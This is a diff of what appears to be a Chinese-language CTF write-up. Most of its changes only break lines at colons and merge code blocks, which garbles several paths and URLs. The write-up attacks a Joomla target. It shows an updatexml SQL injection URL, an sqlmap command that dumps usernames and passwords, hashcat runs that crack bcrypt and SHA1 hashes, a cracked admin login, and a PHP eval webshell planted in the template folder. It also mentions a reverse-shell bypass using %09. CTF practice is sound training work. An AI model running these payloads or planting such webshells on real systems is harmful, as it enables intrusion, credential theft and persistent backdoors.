@@ -97,21 +97,27 @@ flag{e3fd4235-5576-45ff-98b1-ea58fe285391}
 
 https://developer.aliyun.com/article/1099637
 
-http://175.27.169.122:48059/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
+http://175.27.169.122:
+48059/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
 
 直接上sqlmap查用户名和密码
 
-python "E:applicationsqlmapsqlmap.py" -r "C:UsersABCDAppDataLocalTemp\175_27_169_122_48059_20260202004220.req" -p list[fullordering] --level 3 -D joomladb -T #__users -C "username,password" --dump
+python "E:
+applicationsqlmapsqlmap.py" -r "C:
+UsersABCDAppDataLocalTemp\175_27_169_122_48059_20260202004220.req" -p list[fullordering] --level 3 -D joomladb -T #__users -C "username,password" --dump
 
 $2*$开头的哈希是bcrypt
 
-hashcat.exe -a 0 -m 3200 bcrypt.txt E:applicationhashcat-6.2.6rockyou.txtrockyou.txt
+hashcat.exe -a 0 -m 3200 bcrypt.txt E:
+applicationhashcat-6.2.6rockyou.txtrockyou.txt
 
-得到账号密码为ducktail:electric，登录 /administrator
+得到账号密码为ducktail:
+electric，登录 /administrator
 
 创建一句话木马，写入<?php @eval($_POST['cmd']); ?>
 
-连接木马http://175.27.169.122:48059/templates/protostar/shell.php
+连接木马http://175.27.169.122:
+48059/templates/protostar/shell.php
 
 在/home/www-data/目录下发现flag
 
@@ -185,23 +191,11 @@ fuzz了一下发现空格可以使用%09绕过，并且出网可以反弹shell
 
 ```
 grep -r "flag{" /
-```
-
-
-
-```
-python "E:applicationsqlmapsqlmap.py" -r "C:UsersABCDAppDataLocalTemp\175_27_169_122_48059_20260202004220.req" -p list[fullordering] --level 3 -D joomladb -T #__users -C "username,password" --dump
-```
-
-
-
-```
-hashcat.exe -a 0 -m 3200 bcrypt.txt E:applicationhashcat-6.2.6rockyou.txtrockyou.txt
-```
-
-
-
-```
+python "E:
+applicationsqlmapsqlmap.py" -r "C:
+UsersABCDAppDataLocalTemp\175_27_169_122_48059_20260202004220.req" -p list[fullordering] --level 3 -D joomladb -T #__users -C "username,password" --dump
+hashcat.exe -a 0 -m 3200 bcrypt.txt E:
+applicationhashcat-6.2.6rockyou.txtrockyou.txt
 hashcat.exe -m 100 -a 3 c09eceab6d4fa6747fdabfde6654eefb48b51c2a ?a?a?a?a?a?a?a?a?a?a -i
 
 hashcat.exe：这是hashcat工具的可执行文件，运行在Windows系统上。
